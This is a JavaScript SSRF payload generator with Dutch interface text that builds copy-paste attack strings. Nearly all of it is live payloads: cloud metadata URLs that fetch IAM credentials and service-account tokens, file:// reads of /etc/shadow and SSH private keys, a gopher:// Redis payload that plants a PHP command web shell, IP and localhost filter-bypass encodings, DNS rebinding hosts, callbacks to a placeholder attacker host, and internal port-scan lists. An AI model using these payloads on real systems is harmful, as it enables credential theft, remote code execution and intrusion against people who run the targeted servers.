// SSRF Payload Generator — client-side payload building voor copy-paste
(function () {
  'use strict';

  var root = document.getElementById('ssrf-generator');
  if (!root) return;

  function $(id) { return document.getElementById(id); }

  function esc(s) {
    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  function copyText(text, btn) {
    navigator.clipboard.writeText(text).then(function () {
      var orig = btn.textContent;
      btn.textContent = 'Gekopieerd!';
      setTimeout(function () { btn.textContent = orig; }, 1200);
    });
  }

  function renderOutput(containerId, payloads) {
    var container = $(containerId);
    if (!container) return;
    var html = '';
    for (var i = 0; i < payloads.length; i++) {
      var p = payloads[i];
      html += '<div class="gen-block">';
      html += '<div class="gen-label">' + esc(p.label) + '</div>';
      html += '<div class="gen-query"><pre><code>' + esc(p.payload) + '</code></pre>';
      html += '<button class="btn-sm btn-copy" data-idx="' + i + '">Kopieer</button>';
      html += '</div></div>';
    }
    container.innerHTML = html;
    container.querySelectorAll('.btn-copy').forEach(function (btn) {
      btn.addEventListener('click', function () {
        copyText(payloads[parseInt(this.dataset.idx)].payload, this);
      });
    });
  }

  function ipToDecimal(ip) {
    var parts = ip.split('.');
    if (parts.length !== 4) return '0';
    return String(((+parts[0]) * 16777216) + ((+parts[1]) * 65536) + ((+parts[2]) * 256) + (+parts[3]));
  }

  function ipToHex(ip) {
    var parts = ip.split('.');
    if (parts.length !== 4) return '0x00000000';
    return '0x' + parts.map(function (p) { return ('0' + parseInt(p).toString(16)).slice(-2); }).join('');
  }

  function ipToOctal(ip) {
    var parts = ip.split('.');
    if (parts.length !== 4) return ip;
    return parts.map(function (p) { return '0' + parseInt(p).toString(8); }).join('.');
  }

  function ipToIPv6(ip) {
    var parts = ip.split('.');
    if (parts.length !== 4) return ip;
    var hex1 = ('0' + parseInt(parts[0]).toString(16)).slice(-2) + ('0' + parseInt(parts[1]).toString(16)).slice(-2);
    var hex2 = ('0' + parseInt(parts[2]).toString(16)).slice(-2) + ('0' + parseInt(parts[3]).toString(16)).slice(-2);
    return '::ffff:' + hex1 + ':' + hex2;
  }

  $('ssrf-gen-btn').addEventListener('click', function () {
    var target  = $('ssrf-target').value || '169.254.169.254';
    var port    = $('ssrf-port').value || '80';
    var path    = $('ssrf-path').value || '/latest/meta-data/';
    var cb      = $('ssrf-callback').value || 'http://ATTACKER';
    var intHost = $('ssrf-internal').value || '127.0.0.1';
    var intPort = $('ssrf-int-port').value || '8080';
    var file    = $('ssrf-file').value || '/etc/passwd';

    var fullUrl = 'http://' + target + (port !== '80' ? ':' + port : '') + path;

    var results = [];

    // -- Cloud metadata --
    results.push({ label: 'AWS — IMDSv1 metadata', payload: 'http://169.254.169.254/latest/meta-data/\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://169.254.169.254/latest/user-data/' });
    results.push({ label: 'AWS — IMDSv2 (token vereist)', payload: '# Stap 1: Token ophalen\ncurl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"\n\n# Stap 2: Metadata met token\ncurl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/' });
    results.push({ label: 'Azure — Instance Metadata', payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n# Header vereist:\nMetadata: true' });
    results.push({ label: 'GCP — Compute Metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\n# Header vereist:\nMetadata-Flavor: Google' });
    results.push({ label: 'DigitalOcean metadata', payload: 'http://169.254.169.254/metadata/v1.json\nhttp://169.254.169.254/metadata/v1/id\nhttp://169.254.169.254/metadata/v1/user-data' });
    results.push({ label: 'Kubernetes — Service Account Token', payload: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token\nfile:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt\nhttps://kubernetes.default.svc/api/v1/namespaces' });

    // -- Protocol wrappers --
    results.push({ label: 'file:// — lokale bestanden', payload: 'file://' + file + '\nfile:///etc/shadow\nfile:///proc/self/environ\nfile:///proc/self/cmdline\nfile:///home/' + '/.ssh/id_rsa\nfile:///c:/windows/win.ini' });
    results.push({ label: 'gopher:// — poort interactie', payload: 'gopher://' + intHost + ':' + intPort + '/_GET%20/%20HTTP/1.1%0d%0aHost:%20' + intHost + '%0d%0a%0d%0a\n\n# Redis:\ngopher://' + intHost + ':6379/_SET%20shell%20%22<%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%3F>%22%0d%0aCONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSAVE%0d%0a' });
    results.push({ label: 'dict:// — service banner grabbing', payload: 'dict://' + intHost + ':' + intPort + '/info\ndict://' + intHost + ':11211/stats\ndict://' + intHost + ':6379/info' });

    // -- IP bypass varianten --
    results.push({
      label: 'IP bypass varianten — ' + target,
      payload: '# Decimal IP:\nhttp://' + ipToDecimal(target) + path + '\n\n' +
               '# Hex IP:\nhttp://' + ipToHex(target) + path + '\n\n' +
               '# Octal IP:\nhttp://' + ipToOctal(target) + path + '\n\n' +
               '# IPv6 mapped:\nhttp://[' + ipToIPv6(target) + ']' + path + '\n\n' +
               '# Enclosed alphanumeric:\nhttp://' + target.replace(/\./g, '\uff0e') + path + '\n\n' +
               '# URL encoding:\nhttp://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34' + path,
    });

    // Localhost bypass
    results.push({
      label: 'Localhost bypass varianten',
      payload: 'http://127.0.0.1' + path + '\n' +
               'http://localhost' + path + '\n' +
               'http://0.0.0.0' + path + '\n' +
               'http://0' + path + '\n' +
               'http://[::1]' + path + '\n' +
               'http://[::ffff:127.0.0.1]' + path + '\n' +
               'http://[0:0:0:0:0:ffff:127.0.0.1]' + path + '\n' +
               'http://2130706433' + path + '\n' +
               'http://0x7f000001' + path + '\n' +
               'http://017700000001' + path + '\n' +
               'http://127.1' + path + '\n' +
               'http://127.0.1' + path,
    });

    // -- Redirect based --
    results.push({
      label: 'Redirect-based SSRF — via IB redirect',
      payload: cb + '/ssrf/redirect?url=' + encodeURIComponent(fullUrl) + '\n' +
               cb + '/ssrf/aws\n' +
               cb + '/ssrf/azure\n' +
               cb + '/ssrf/google',
    });

    // -- DNS rebinding --
    results.push({
      label: 'DNS rebinding',
      payload: '# Gebruik een DNS rebinding service:\n' +
               'http://7f000001.c0a80001.rbndr.us' + path + '\n' +
               '# OF met make-resolve-to:\n' +
               'http://' + target + '.1time.' + intHost + '.1time.repeat.rebind.network' + path,
    });

    // -- Blind SSRF callback --
    results.push({
      label: 'Blind SSRF — callback bevestiging',
      payload: cb + '/ssrf/callback?data=ssrf_confirmed\n\n' +
               '# Burp Collaborator / interactsh:\nhttp://COLLABORATOR_URL',
    });

    // -- Internal port scan --
    results.push({
      label: 'Internal port scan payloads',
      payload: '# Veelgebruikte interne poorten:\n' +
               'http://' + intHost + ':22/\n' +
               'http://' + intHost + ':80/\n' +
               'http://' + intHost + ':443/\n' +
               'http://' + intHost + ':3306/\n' +
               'http://' + intHost + ':5432/\n' +
               'http://' + intHost + ':6379/\n' +
               'http://' + intHost + ':8080/\n' +
               'http://' + intHost + ':8443/\n' +
               'http://' + intHost + ':9200/\n' +
               'http://' + intHost + ':27017/',
    });

    renderOutput('ssrf-gen-output', results);
  });
})();
